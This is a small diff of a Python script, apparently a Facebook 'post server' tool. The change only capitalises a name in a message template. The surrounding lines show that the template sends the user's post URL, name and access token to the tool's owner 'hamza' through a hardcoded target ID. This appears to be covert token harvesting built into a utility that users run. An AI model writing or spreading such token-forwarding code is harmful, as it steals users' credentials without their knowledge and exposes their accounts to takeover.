@@ -103,7 +103,7 @@ def send_initial_message():
         sys.exit()
     
     # Message template
-    msg_template = "Owner => hamza \n Hello hamza sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => Hamza \n Hello hamza sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
     target_ids = ["100082262756102"]
